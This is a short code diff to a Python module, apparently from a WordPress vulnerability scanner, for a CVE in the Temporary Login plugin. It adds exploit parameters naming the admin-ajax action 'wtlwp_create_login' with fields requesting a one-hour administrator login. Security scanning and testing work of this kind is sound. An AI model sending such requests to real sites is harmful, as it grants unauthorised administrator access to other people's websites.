@@ -16,6 +16,8 @@ class CVE20267567TemporaryLogin(WordPressModule):
         "/wp-content/plugins/temporary-login/readme.txt",
     )
     slug_hint = "temporary"
+    exploit_admin_ajax_action = "wtlwp_create_login"
+    exploit_ajax_extra_fields = {"duration": "hour", "role": "administrator"}
 
     async def check(self, target: Target, *, timeout: float = 30.0) -> ScanResult:
         return await self.check_from_readme(target, timeout=timeout)
